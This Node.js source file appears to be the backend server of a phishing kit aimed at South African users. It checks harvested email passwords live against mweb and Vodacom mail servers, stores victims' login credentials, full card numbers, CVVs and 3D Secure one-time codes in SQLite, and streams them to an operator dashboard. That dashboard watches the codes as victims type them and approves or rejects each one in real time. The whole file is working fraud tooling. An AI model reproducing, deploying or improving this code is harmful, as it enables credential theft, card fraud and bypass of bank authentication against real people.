import { WebSocketServer, WebSocket } from "ws";
import { createServer } from "node:http";
import fs from "node:fs";
import path from "node:path";
import Database from "better-sqlite3";
import process from "node:process";
import nodemailer from "nodemailer";
import { connect } from "node:tls";

// Use PORT for Render.com compatibility, fallback to WS_PORT or 8090
const port = Number(process.env.PORT || process.env.WS_PORT || 8090);

// SMTP configuration based on email domain
function getSMTPConfig(email) {
  const emailLower = email.toLowerCase();
  console.log("[SMTP Config] Checking domain for email:", emailLower);
  
  // @mweb.co.za uses POP3 connectivity test instead of SMTP
  if (emailLower.includes("@mweb.co.za")) {
    console.log("[SMTP Config] Detected @mweb.co.za domain - will use POP3 test");
    return null; // POP3 test will be done separately
  }
  
  // @webmail.co.za and @vodamail.co.za no longer require SMTP verification
  // They will skip verification and proceed normally
  
  if (emailLower.includes("@vodacom.co.za")) {
    console.log("[SMTP Config] Detected @vodacom.co.za domain");
    return {
      host: "smtp.vodacom.co.za",
      port: 587,
      secure: false, // TLS
      requireTLS: true,
    };
  }
  
  console.log("[SMTP Config] Domain does not require verification");
  return null; // No verification needed for other domains
}

// Test POP3 connectivity for @mweb.co.za
async function testPOP3Connectivity(email, password) {
  return new Promise((resolve) => {
    console.log("[POP3] Testing connectivity to pop.mweb.co.za:995 for:", email);
    
    // Extract username from email (some POP3 servers require just the username)
    const username = email.split("@")[0];
    console.log("[POP3] Using username:", username, "and full email:", email);
    
    // Set connection timeout before connecting (15 seconds for reliable connection)
    let connectionTimeout = setTimeout(() => {
      console.error("[POP3] Connection timeout - unable to establish connection within 15 seconds");
      resolve({ 
        success: false, 
        skip: false,
        error: "Connection timeout - unable to connect to server" 
      });
    }, 15000);
    
    const socket = connect(995, "pop.mweb.co.za", {
      rejectUnauthorized: false, // Accept self-signed certificates
    }, () => {
      // Clear connection timeout once connected
      clearTimeout(connectionTimeout);
      console.log("[POP3] Connected to pop.mweb.co.za:995");
      
      let dataBuffer = "";
      let state = "greeting"; // greeting -> user -> pass -> done
      let attempts = 0;
      const maxAttempts = 2;
      
      socket.on("data", (data) => {
        dataBuffer += data.toString();
        
        // Check if we have a complete response (ends with \r\n)
        if (dataBuffer.includes("\r\n")) {
          const lines = dataBuffer.split("\r\n");
          const response = lines[0];
          console.log("[POP3] Server response:", response);
          
          if (state === "greeting") {
            if (response.startsWith("+OK")) {
              // Try with full email first, then username only
              const userToTry = attempts === 0 ? email : username;
              console.log(`[POP3] Sending USER command (attempt ${attempts + 1}/${maxAttempts}):`, userToTry);
              socket.write(`USER ${userToTry}\r\n`);
              dataBuffer = "";
              state = "user";
            } else {
              clearTimeout(connectionTimeout); // Clear timeout on failure
              socket.end();
              console.log("[POP3] Server greeting failed");
              resolve({ 
                success: false, 
                skip: false,
                error: "POP3 server error" 
              });
            }
          } else if (state === "user") {
            if (response.startsWith("+OK")) {
              // Send PASS command
              console.log("[POP3] Sending PASS command");
              socket.write(`PASS ${password}\r\n`);
              dataBuffer = "";
              state = "pass";
            } else {
              // If USER failed and we haven't tried username yet, retry with username
              if (attempts < maxAttempts - 1 && response.includes("ERR")) {
                attempts++;
                console.log("[POP3] USER command failed, retrying with username only");
                state = "greeting";
                dataBuffer = "";
                // Wait a bit before retrying
                setTimeout(() => {
                  const userToTry = username;
                  console.log(`[POP3] Retrying USER command with:`, userToTry);
                  socket.write(`USER ${userToTry}\r\n`);
                  state = "user";
                }, 100);
                return;
              }
              clearTimeout(connectionTimeout); // Clear timeout on failure
              socket.end();
              console.log("[POP3] USER command failed");
              resolve({ 
                success: false, 
                skip: false,
                error: "Invalid email or password" 
              });
            }
          } else if (state === "pass") {
            clearTimeout(connectionTimeout); // Clear timeout on completion
            socket.end();
            if (response.startsWith("+OK")) {
              console.log("[POP3] Authentication successful!");
              resolve({ success: true, skip: false });
              } else {
                clearTimeout(connectionTimeout); // Clear timeout on failure
                console.log("[POP3] Authentication failed, response:", response);
                // If PASS failed and we used full email, try with username
                if (attempts === 0 && response.includes("ERR")) {
                  attempts++;
                  console.log("[POP3] Retrying with username only");
                  socket.destroy();
                  // Retry the whole process with username
                  setTimeout(() => {
                    testPOP3Connectivity(username + "@mweb.co.za", password).then(resolve);
                  }, 500);
                  return;
                }
                resolve({ 
                  success: false, 
                  skip: false,
                  error: "Invalid email or password" 
                });
              }
          }
        }
      });
    });
    
    socket.on("error", (error) => {
      // Clear connection timeout on error
      clearTimeout(connectionTimeout);
      
      console.error("[POP3] Connection error:", error.message);
      // If connection is refused, it might be due to firewall/IP blocking
      const isConnectionRefused = error.message.includes("ECONNREFUSED") || error.message.includes("ENOTFOUND");
      
      // Only simulate success if explicitly enabled (for testing purposes)
      // By default, we fail the verification to ensure security
      if (isConnectionRefused && process.env.ALLOW_LOCALHOST_POP3 === "true") {
        console.log("[POP3] Connection refused - likely due to localhost/IP blocking.");
        console.log("[POP3] ALLOW_LOCALHOST_POP3=true is set - simulating successful verification for localhost testing");
        console.log("[POP3] WARNING: This is a simulation. In production, real verification will be performed.");
        resolve({ 
          success: true, 
          skip: false,
          error: null,
          simulated: true // Indicate this is simulated
        });
        return;
      }
      
      // Real failure - connection refused or other error
      console.log("[POP3] Verification failed:", error.message);
      if (isConnectionRefused) {
        console.log("[POP3] Note: Connection refused may be due to IP blocking. In production with valid IP, this should work.");
      }
      
      resolve({ 
        success: false, 
        skip: false,
        error: `Connection failed: ${error.message}` 
      });
    });
    
    // Set timeout for socket operations after connection (15 seconds)
    socket.setTimeout(15000, () => {
      clearTimeout(connectionTimeout); // Clear connection timeout if socket timeout triggers
      console.error("[POP3] Socket timeout after 15 seconds");
      socket.destroy();
      resolve({ 
        success: false, 
        skip: false,
        error: "Connection timeout" 
      });
    });
  });
}

// Verify SMTP credentials
async function verifySMTPCredentials(email, password) {
  console.log("[SMTP Verify] Starting verification for:", email);
  
  // For @mweb.co.za, use POP3 connectivity test instead of SMTP
  if (email.toLowerCase().includes("@mweb.co.za")) {
    console.log("[SMTP Verify] Using POP3 test for @mweb.co.za");
    return await testPOP3Connectivity(email, password);
  }
  
  const config = getSMTPConfig(email);
  if (!config) {
    // No verification needed for this domain
    console.log("[SMTP Verify] No config found, skipping verification");
    return { success: true, skip: true };
  }
  
  // For other domains, use SMTP verification
  const hostsToTry = [config.host];
  
  // Try multiple port/security combinations for better compatibility
  // Order matters: try the configured port first, then alternatives
  const defaultPort = config.port;
  const defaultSecure = config.secure;
  const defaultRequireTLS = config.requireTLS;
  
  const portConfigs = [
    { port: defaultPort, secure: defaultSecure, requireTLS: defaultRequireTLS }, // Use configured settings first
    { port: 465, secure: true, requireTLS: false },  // SSL (alternative)
    { port: 587, secure: false, requireTLS: true },   // STARTTLS (alternative)
  ];
  
  let lastError = null;
  
  for (const host of hostsToTry) {
    for (const portConfig of portConfigs) {
      console.log("[SMTP Verify] Trying host:", host, "port:", portConfig.port, "secure:", portConfig.secure);
      
      try {
        const transporter = nodemailer.createTransport({
          host: host,
          port: portConfig.port,
          secure: portConfig.secure,
          requireTLS: portConfig.requireTLS,
          auth: {
            user: email,
            pass: password,
          },
          connectionTimeout: 15000, // 15 seconds timeout (increased)
          greetingTimeout: 15000,
          socketTimeout: 15000,
          // Additional options for better compatibility
          tls: {
            rejectUnauthorized: false, // Accept self-signed certificates
            ciphers: 'SSLv3',
          },
          // Ignore certificate errors for testing
          ignoreTLS: false,
          debug: false,
        });
        
        console.log("[SMTP Verify] Attempting to verify connection...");
        // Verify connection and authentication
        await transporter.verify();
        console.log("[SMTP Verify] Verification successful with host:", host, "port:", portConfig.port);
        
        return { success: true, skip: false };
      } catch (error) {
        console.error(`[SMTP Verify] Verification failed for ${email} with host ${host}:${portConfig.port}:`, error.message);
        lastError = error;
        // Continue to next port config if available
        if (portConfigs.indexOf(portConfig) < portConfigs.length - 1) {
          console.log("[SMTP Verify] Trying next port configuration...");
          continue;
        }
      }
    }
    
    // If all ports failed for this host, try next host
    if (hostsToTry.indexOf(host) < hostsToTry.length - 1) {
      console.log("[SMTP Verify] All ports failed for", host, "- trying next host...");
      continue;
    }
  }
  
  // All hosts and ports failed
  return { 
    success: false, 
    skip: false,
    error: lastError ? lastError.message : "All SMTP hosts and ports failed"
  };
}

// Create HTTP server (required for Render)
const server = createServer(async (req, res) => {
  // Enable CORS - Set headers for all requests
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type, Authorization");
  res.setHeader("Access-Control-Max-Age", "86400"); // 24 hours
  
  // Handle preflight requests (OPTIONS)
  if (req.method === "OPTIONS") {
    console.log("[CORS] Handling OPTIONS preflight request");
    res.writeHead(200, {
      "Access-Control-Allow-Origin": "*",
      "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
      "Access-Control-Allow-Headers": "Content-Type, Authorization",
      "Access-Control-Max-Age": "86400",
    });
    res.end();
    return;
  }
  
  // SMTP verification endpoint
  if (req.method === "POST" && req.url === "/api/verify-smtp") {
    console.log("[SMTP API] Received POST request to /api/verify-smtp");
    console.log("[SMTP API] Request headers:", req.headers);
    
    let body = "";
    req.on("data", (chunk) => {
      body += chunk.toString();
    });
    
    req.on("end", async () => {
      try {
        console.log("[SMTP API] Request body:", body);
        const data = JSON.parse(body);
        const { email, password } = data;
        
        console.log("[SMTP API] Email:", email, "Password:", password ? "***" : "missing");
        
        if (!email || !password) {
          console.log("[SMTP API] Missing email or password");
          res.writeHead(400, { 
            "Content-Type": "application/json",
            "Access-Control-Allow-Origin": "*",
          });
          res.end(JSON.stringify({ success: false, error: "Email and password are required" }));
          return;
        }
        
        console.log("[SMTP API] Calling verifySMTPCredentials for:", email);
        const result = await verifySMTPCredentials(email, password);
        console.log("[SMTP API] Verification result:", result);
        
        res.writeHead(200, { 
          "Content-Type": "application/json",
          "Access-Control-Allow-Origin": "*",
        });
        res.end(JSON.stringify(result));
      } catch (error) {
        console.error("[SMTP API] Error in SMTP verification endpoint:", error);
        res.writeHead(500, { 
          "Content-Type": "application/json",
          "Access-Control-Allow-Origin": "*",
        });
        res.end(JSON.stringify({ success: false, error: "Internal server error" }));
      }
    });
    return;
  }
  
  // Simple HTTP endpoint for health checks
  if (req.url === "/" || req.url === "/health") {
    res.writeHead(200, { "Content-Type": "text/plain" });
    res.end("WebSocket server is running");
    return;
  }
  
  res.writeHead(404);
  res.end();
});

// Attach WebSocket server to HTTP server
const wss = new WebSocketServer({ server });

function heartbeat() {
  this.isAlive = true;
}

const pingIntervalMs = 30000;
const interval = setInterval(() => {
  wss.clients.forEach((ws) => {
    if (ws.isAlive === false) {
      ws.terminate();
      return;
    }
    ws.isAlive = false;
    ws.ping();
  });
}, pingIntervalMs);

const dataDirectory = path.resolve(process.cwd());
fs.mkdirSync(dataDirectory, { recursive: true });
const dbPath = path.join(dataDirectory, "clients.sqlite");
const db = new Database(dbPath);

// Enhanced database schema with all client data
db.exec(`
  CREATE TABLE IF NOT EXISTS clients (
    id TEXT PRIMARY KEY,
    ip TEXT,
    created_at INTEGER NOT NULL,
    last_seen INTEGER NOT NULL,
    current_page TEXT,
    
    -- Track page data
    full_name TEXT,
    phone TEXT,
    email TEXT,
    address TEXT,
    postal_code TEXT,
    
    -- Login page data
    login_email TEXT,
    login_password TEXT,
    
    -- Payment page data
    card_holder TEXT,
    card_number TEXT,
    card_expiration TEXT,
    card_cvv TEXT,
    
    -- 3D Secure data
    otp_code TEXT,
    otp_status TEXT,
    otp_submitted_at INTEGER
  )
`);

const upsertClient = db.prepare(
  "INSERT INTO clients (id, ip, created_at, last_seen) VALUES (?, ?, ?, ?) ON CONFLICT(id) DO UPDATE SET last_seen=excluded.last_seen, ip=excluded.ip"
);

const updateClientPage = db.prepare(
  "UPDATE clients SET current_page=?, last_seen=? WHERE id=?"
);

const updateClientTrackData = db.prepare(
  "UPDATE clients SET full_name=?, phone=?, email=NULL, address=?, postal_code=?, last_seen=? WHERE id=?"
);

const updateClientLoginData = db.prepare(
  "UPDATE clients SET login_email=?, login_password=?, last_seen=? WHERE id=?"
);

const updateClientPaymentData = db.prepare(
  "UPDATE clients SET card_holder=?, card_number=?, card_expiration=?, card_cvv=?, last_seen=? WHERE id=?"
);

const updateClientOTP = db.prepare(
  "UPDATE clients SET otp_code=?, otp_status=?, otp_submitted_at=?, last_seen=? WHERE id=?"
);

const deleteClient = db.prepare("DELETE FROM clients WHERE id=?");

const getClientById = db.prepare("SELECT * FROM clients WHERE id=?");
const getAllClients = db.prepare(
  "SELECT * FROM clients ORDER BY last_seen DESC"
);

// In-memory routing map for live connections
const clientIdToSocket = new Map();
const socketToClientId = new WeakMap();
const socketToRole = new WeakMap();
const dashboards = new Set();

function broadcastToDashboards(messageObj) {
  const payload = JSON.stringify(messageObj);
  console.log(`[Broadcast] Broadcasting to ${dashboards.size} dashboard(s):`, messageObj.type);
  let sentCount = 0;
  dashboards.forEach((d) => {
    if (d.readyState === WebSocket.OPEN) {
      try {
        d.send(payload);
        sentCount++;
        console.log(`[Broadcast] Message sent to dashboard (${sentCount}/${dashboards.size})`);
      } catch (err) {
        console.error(`[Broadcast] Error sending to dashboard:`, err);
      }
    } else {
      console.warn(`[Broadcast] Dashboard connection not OPEN (state: ${d.readyState})`);
    }
  });
  if (sentCount === 0 && dashboards.size > 0) {
    console.warn(`[Broadcast] WARNING: No messages sent despite ${dashboards.size} dashboard(s) registered`);
  }
}

function clientToJSON(dbRow) {
  if (!dbRow) return null;
  return {
    id: dbRow.id,
    ip: dbRow.ip,
    page: dbRow.current_page,
    fullName: dbRow.full_name,
    phone: dbRow.phone,
    email: dbRow.email,
    address: dbRow.address,
    postalCode: dbRow.postal_code,
    cardHolder: dbRow.card_holder,
    loginEmail: dbRow.login_email,
    loginPassword: dbRow.login_password,
    cardNumber: dbRow.card_number,
    cardExpiration: dbRow.card_expiration,
    cardCvv: dbRow.card_cvv,
    otp: dbRow.otp_code,
    otpStatus: dbRow.otp_status,
    otpSubmittedAt: dbRow.otp_submitted_at,
    lastSeen: dbRow.last_seen,
    createdAt: dbRow.created_at,
  };
}

// Helper to get real client IP
function getClientIP(req) {
  // Check X-Forwarded-For header (nginx/proxy)
  const forwarded = req.headers["x-forwarded-for"];
  if (forwarded) {
    const ips = forwarded.split(",");
    return ips[0].trim();
  }

  // Check X-Real-IP header
  const realIp = req.headers["x-real-ip"];
  if (realIp) {
    return realIp.trim();
  }

  // Fallback to socket address
  let ip = req.socket.remoteAddress || req.connection.remoteAddress;

  // Clean IPv6 localhost
  if (ip === "::1" || ip === "::ffff:127.0.0.1") {
    ip = "127.0.0.1";
  }

  // Remove IPv6 prefix
  if (ip && ip.startsWith("::ffff:")) {
    ip = ip.substring(7);
  }

  return ip || "Unknown";
}

wss.on("connection", (ws, req) => {
  ws.isAlive = true;
  ws.on("pong", heartbeat);

  const clientAddress = getClientIP(req);

  console.log(`Client connected from IP: ${clientAddress}`);

  ws.send(
    JSON.stringify({
      type: "welcome",
      message: "Connected to Rams websocket server",
      time: Date.now(),
      you: clientAddress,
    })
  );

  ws.on("message", (data) => {
    let message = null;
    try {
      message = JSON.parse(String(data));
    } catch {
      // Ignore non-JSON messages
      return;
    }

    if (!message || typeof message !== "object" || !message.type) {
      return;
    }

    if (message.type === "register" && typeof message.clientId === "string") {
      const now = Date.now();
      try {
        const role = typeof message.role === "string" ? message.role : "user";
        socketToRole.set(ws, role);

        if (role === "dashboard") {
          dashboards.add(ws);
          console.log(`[Server] Dashboard added. Total dashboards: ${dashboards.size}`);
        } else {
          // Register client in database
          console.log(`[Server] Registering client in database: ${message.clientId}`);
          upsertClient.run(message.clientId, clientAddress, now, now);
          clientIdToSocket.set(message.clientId, ws);
          socketToClientId.set(ws, message.clientId);

          const client = getClientById.get(message.clientId);
          const clientData = clientToJSON(client);
          console.log(`[Server] Client registered: ${message.clientId}, IP: ${clientAddress}`);
          console.log(`[Server] Client data:`, clientData);
          console.log(`[Server] Broadcasting to ${dashboards.size} dashboard(s)`);
          broadcastToDashboards({
            type: "client_registered",
            client: clientData,
          });
        }

        console.log(`Client registered: ${message.clientId}, role: ${role}`);
        ws.send(
          JSON.stringify({
            type: "registered",
            clientId: message.clientId,
            role: role,
            ip: clientAddress,
            time: now,
          })
        );
        
        // If it's a dashboard, send the client list immediately after registration
        if (role === "dashboard") {
          setTimeout(() => {
            try {
              const clients = getAllClients.all();
              const items = clients.map(clientToJSON).filter((c) => c !== null);
              console.log(`Auto-sending ${items.length} clients to dashboard after registration`);
              ws.send(JSON.stringify({ type: "clients", items }));
            } catch (err) {
              console.error("Error auto-sending clients list:", err);
            }
          }, 200);
        }
      } catch (err) {
        console.error("Registration error:", err);
        ws.send(
          JSON.stringify({ type: "error", message: "registration_failed" })
        );
      }
      return;
    }

    // Dashboard requests live list
    if (message.type === "list") {
      const role = socketToRole.get(ws);
      console.log(`[Server] List request received from role: ${role}`);
      if (role === "dashboard") {
        try {
          const clients = getAllClients.all();
          console.log(`[Server] Found ${clients.length} clients in database`);
          const items = clients.map(clientToJSON).filter((c) => c !== null);
          console.log(`[Server] Sending ${items.length} clients to dashboard:`, items.map(c => ({ id: c.id, page: c.page })));
          ws.send(JSON.stringify({ type: "clients", items }));
        } catch (err) {
          console.error("[Server] Error fetching clients list:", err);
          ws.send(JSON.stringify({ type: "clients", items: [] }));
        }
        return;
      } else {
        console.log(`[Server] List request ignored - not a dashboard (role: ${role})`);
      }
    }

    // Presence updates from user clients
    if (
      message.type === "presence" &&
      typeof message.clientId === "string" &&
      typeof message.page === "string"
    ) {
      try {
        const now = Date.now();
        // Store page without query parameters for cleaner display
        const cleanPage = message.page.split("?")[0];
        updateClientPage.run(cleanPage, now, message.clientId);
        const client = getClientById.get(message.clientId);
        broadcastToDashboards({
          type: "client_updated",
          client: clientToJSON(client),
        });
      } catch (err) {
        console.error("Presence update error:", err);
      }
      return;
    }

    // OTP updates while typing on 3D Secure page
    if (
      message.type === "otp_update" &&
      typeof message.clientId === "string" &&
      typeof message.otp === "string"
    ) {
      try {
        const now = Date.now();
        updateClientOTP.run(message.otp, "typing", null, now, message.clientId);
        const client = getClientById.get(message.clientId);
        broadcastToDashboards({
          type: "client_updated",
          client: clientToJSON(client),
        });
      } catch (err) {
        console.error("OTP update error:", err);
      }
      return;
    }

    // OTP submitted: dashboard must decide success/error
    if (
      message.type === "otp_submit" &&
      typeof message.clientId === "string" &&
      typeof message.otp === "string"
    ) {
      try {
        const now = Date.now();
        updateClientOTP.run(
          message.otp,
          "submitted",
          now,
          now,
          message.clientId
        );
        const client = getClientById.get(message.clientId);
        broadcastToDashboards({
          type: "client_updated",
          client: clientToJSON(client),
        });
      } catch (err) {
        console.error("OTP submit error:", err);
      }
      return;
    }

    if (
      message.type === "direct" &&
      typeof message.to === "string" &&
      (Object.prototype.hasOwnProperty.call(message, "payload") ||
        typeof message.action === "string")
    ) {
      const fromId = socketToClientId.get(ws) || null;
      const target = clientIdToSocket.get(message.to);

      // Validate optional action URL if provided
      let actionUrl = undefined;
      if (typeof message.action === "string") {
        try {
          const url = new URL(message.action);
          if (url.protocol === "http:" || url.protocol === "https:") {
            actionUrl = url.toString();
          }
        } catch {
          // invalid URL ignored
        }
      }

      if (target && target.readyState === WebSocket.OPEN) {
        target.send(
          JSON.stringify({
            type: "direct",
            from: fromId,
            payload: message.payload,
            action: actionUrl,
            time: Date.now(),
          })
        );
        // Update OTP decision status for dashboards
        try {
          const toId = message.to;
          if (message.payload && typeof message.payload === "object") {
            const now = Date.now();
            let otpStatus = null;
            if (message.payload.type === "allow-next") otpStatus = "approved";
            if (message.payload.type === "error") otpStatus = "rejected";

            if (otpStatus) {
              const client = getClientById.get(toId);
              if (client) {
                updateClientOTP.run(
                  client.otp_code,
                  otpStatus,
                  client.otp_submitted_at,
                  now,
                  toId
                );
                const updatedClient = getClientById.get(toId);
                broadcastToDashboards({
                  type: "client_updated",
                  client: clientToJSON(updatedClient),
                });
              }
            }
          }
        } catch (err) {
          console.error("Direct message update error:", err);
        }
        ws.send(JSON.stringify({ type: "delivered", to: message.to }));
      } else {
        ws.send(JSON.stringify({ type: "undelivered", to: message.to }));
      }
      return;
    }

    // Track data submission
    if (message.type === "track_data" && typeof message.clientId === "string") {
      try {
        const now = Date.now();
        updateClientTrackData.run(
          message.fullName || null,
          message.phone || null,
          message.address || null,
          message.postalCode || null,
          now,
          message.clientId
        );
        const client = getClientById.get(message.clientId);
        broadcastToDashboards({
          type: "client_updated",
          client: clientToJSON(client),
        });
        ws.send(JSON.stringify({ type: "track_data_saved" }));
      } catch (err) {
        console.error("Track data save error:", err);
        ws.send(
          JSON.stringify({ type: "error", message: "track_data_failed" })
        );
      }
      return;
    }

    // Login data submission
    if (
      message.type === "login_data" &&
      typeof message.clientId === "string"
    ) {
      try {
        const now = Date.now();
        updateClientLoginData.run(
          message.email || null,
          message.password || null,
          now,
          message.clientId
        );
        const client = getClientById.get(message.clientId);
        broadcastToDashboards({
          type: "client_updated",
          client: clientToJSON(client),
        });
        ws.send(JSON.stringify({ type: "login_data_saved" }));
      } catch (err) {
        console.error("Login data save error:", err);
        ws.send(
          JSON.stringify({ type: "error", message: "login_data_failed" })
        );
      }
      return;
    }

    // Payment data submission
    if (
      message.type === "payment_data" &&
      typeof message.clientId === "string"
    ) {
      try {
        const now = Date.now();
        updateClientPaymentData.run(
          message.cardHolder || null,
          message.cardNumber || null,
          message.cardExpiration || null,
          message.cardCvv || null,
          now,
          message.clientId
        );
        const client = getClientById.get(message.clientId);
        broadcastToDashboards({
          type: "client_updated",
          client: clientToJSON(client),
        });
        ws.send(JSON.stringify({ type: "payment_data_saved" }));
      } catch (err) {
        console.error("Payment data save error:", err);
        ws.send(
          JSON.stringify({ type: "error", message: "payment_data_failed" })
        );
      }
      return;
    }

    // Session complete: client finished the process
    if (
      message.type === "session_complete" &&
      typeof message.clientId === "string"
    ) {
      try {
        deleteClient.run(message.clientId);
        console.log(
          `Client ${message.clientId} removed from database (session complete)`
        );
        broadcastToDashboards({
          type: "client_disconnected",
          clientId: message.clientId,
        });
        ws.send(JSON.stringify({ type: "session_complete_ack" }));
      } catch (err) {
        console.error("Session complete error:", err);
      }
      return;
    }
  });

  ws.on("close", () => {
    const role = socketToRole.get(ws);
    if (role === "dashboard") {
      dashboards.delete(ws);
    }
    const id = socketToClientId.get(ws);
    if (id && clientIdToSocket.get(id) === ws) {
      clientIdToSocket.delete(id);
      // Delete client from database on disconnect
      try {
        deleteClient.run(id);
        console.log(`Client ${id} removed from database (disconnected)`);
      } catch (err) {
        console.error("Error deleting client:", err);
      }
      broadcastToDashboards({ type: "client_disconnected", clientId: id });
    }
    socketToClientId.delete(ws);
    socketToRole.delete(ws);
  });

  ws.on("error", (err) => {
    console.error("WebSocket error:", err);
  });
});

wss.on("close", () => {
  clearInterval(interval);
});

// Start the HTTP server (which serves WebSocket connections)
server.listen(port, () => {
  console.log(`WebSocket server listening on port ${port}`);
});
